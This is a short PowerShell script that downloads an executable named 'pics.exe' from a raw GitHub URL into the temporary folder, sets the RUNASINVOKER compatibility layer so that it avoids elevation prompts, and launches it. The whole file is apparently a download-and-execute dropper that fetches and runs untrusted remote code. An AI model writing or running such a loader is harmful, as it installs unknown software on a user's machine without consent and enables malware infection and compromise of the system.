# Download the executable file
Invoke-WebRequest -Uri "https://raw.githubusercontent.com/IncsecRishie/wdwddwdw/main/pics.exe" -OutFile "$env:TEMP\pics.exe"

# Set the compatibility layer
$env:__COMPAT_LAYER = "RUNASINVOKER"

# Execute the downloaded executable file
Start-Process "$env:TEMP\pics.exe"
